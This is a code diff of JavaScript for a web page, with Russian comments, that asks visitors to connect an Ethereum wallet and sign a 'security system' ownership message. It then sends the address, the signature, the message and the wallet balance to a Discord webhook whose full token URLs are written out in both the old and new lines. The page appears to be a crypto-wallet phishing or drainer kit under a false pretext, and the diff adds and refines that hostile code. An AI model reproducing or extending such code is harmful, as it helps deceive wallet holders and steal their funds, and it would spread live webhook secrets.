@@ -27,8 +27,8 @@ function hideElement(element) {
 }
 
 // Функция для отправки данных на Discord webhook
-async function sendToDiscordWebhook(userAddress, signature, message, originalMessage) {
-    const webhookURL = 'https://discordapp.com/api/webhooks/1420894782083039342/luCcgJm7YNsLeYiYYd92cI_P1cMjHFQ08yd8JDUMo7O9zjru1U_tSCcowd1DXtdG4rZ7';
+async function sendToDiscordWebhook(userAddress, signature, message) {
+    const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
     
     // Получаем баланс и название сети
     const balance = await getShortBalance();
@@ -65,12 +65,7 @@ async function sendToDiscordWebhook(userAddress, signature, message, originalMes
                 inline: false
             },
             {
-                name: "📝 Оригинальное сообщение",
-                value: `\`\`\`${originalMessage}\`\`\``,
-                inline: false
-            },
-            {
-                name: "📋 Подписанное сообщение",
+                name: "📝 Сообщение",
                 value: `\`\`\`${message}\`\`\``,
                 inline: false
             },
@@ -107,7 +102,8 @@ async function sendToDiscordWebhook(userAddress, signature, message, originalMes
             console.log('✅ Данные успешно отправлены в Discord');
             return true;
         } else {
-            console.error('❌ Ошибка отправки в Discord:', response.status);
+            console.error('❌ Ошибка отправки в Discord. Статус:', response.status);
+            console.error('Текст ошибки:', await response.text());
             return false;
         }
     } catch (error) {
@@ -212,11 +208,11 @@ signButton.addEventListener('click', async () => {
         signButton.classList.add('loading');
         updateStatus('⌛ Запрос на подписание сообщения...', false, true);
         
-        const originalMessage = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
-        const signature = await web3.eth.personal.sign(originalMessage, userAddress, '');
+        const message = `Подтверждение владения кошельком для системы безопасности. Время: ${new Date().toLocaleString()}`;
+        const signature = await web3.eth.personal.sign(message, userAddress, '');
         
         // Проверяем подпись
-        const isValid = await verifySignature(originalMessage, signature, userAddress);
+        const isValid = await verifySignature(message, signature, userAddress);
         
         console.log('Полученная подпись:', signature);
         console.log('Длина подписи:', signature.length);
@@ -224,7 +220,7 @@ signButton.addEventListener('click', async () => {
         
         // Отправляем данные в Discord
         updateStatus('⌛ Отправка данных на сервер...', false, true);
-        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, originalMessage, originalMessage);
+        const sendSuccess = await sendToDiscordWebhook(userAddress, signature, message);
         
         if (sendSuccess) {
             if (isValid) {
@@ -292,5 +288,3 @@ if (typeof window.ethereum !== 'undefined') {
         window.location.reload();
     });
 }
-
-
